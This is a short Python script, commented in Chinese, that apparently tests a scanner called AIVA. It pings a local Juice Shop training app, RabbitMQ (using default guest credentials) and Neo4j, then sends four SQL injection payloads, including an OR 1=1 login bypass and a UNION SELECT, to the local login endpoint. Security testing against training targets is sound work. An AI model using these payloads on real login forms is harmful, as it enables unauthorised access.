import requests
import json
import time

print("🎯 AIVA SQLi 掃描測試 - 使用運行中的基礎設施")
print("=" * 50)

# 測試 Juice Shop 連接
print("📡 測試 Juice Shop 連接...")
try:
    response = requests.get("http://localhost:3000/api/Users", timeout=5)
    print(f"✅ Juice Shop 響應: {response.status_code}")
    if response.status_code == 200:
        users = response.json()
        print(f"📊 發現 {len(users['data'])} 個用戶")
except Exception as e:
    print(f"❌ Juice Shop 連接失敗: {e}")

# 測試基礎設施連接
print("\n🔌 測試基礎設施連接...")
try:
    # 測試 RabbitMQ 管理介面
    response = requests.get("http://localhost:15672/api/overview", 
                          auth=("guest", "guest"), timeout=5)
    print(f"✅ RabbitMQ 響應: {response.status_code}")
    
    # 測試 Neo4j
    response = requests.get("http://localhost:7474/db/data/", timeout=5)
    print(f"✅ Neo4j 響應: {response.status_code}")
    
except Exception as e:
    print(f"⚠️ 基礎設施連接問題: {e}")

# 手動 SQLi 測試負載
print("\n💉 手動 SQL 注入測試...")
test_payloads = [
    "admin'--",
    "admin' OR 1=1--",
    "' UNION SELECT 1,2,3--",
    "1 AND (SELECT SUBSTRING(@@version,1,1))='5'",
]

target_url = "http://localhost:3000/rest/user/login"
for i, payload in enumerate(test_payloads, 1):
    try:
        data = {"email": payload, "password": "test"}
        response = requests.post(target_url, json=data, timeout=5)
        print(f"  {i}. Payload: {payload[:20]}... -> Status: {response.status_code}")
        
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(f"     🚨 可能的 SQL 錯誤響應!")
        
        # 檢查響應長度差異（布爾盲注檢測）
        if len(response.text) > 1000:
            print(f"     📏 響應長度: {len(response.text)} bytes")
            
    except Exception as e:
        print(f"     ❌ 請求失敗: {str(e)[:50]}...")

print("\n✅ 測試完成 - 基礎設施運行正常")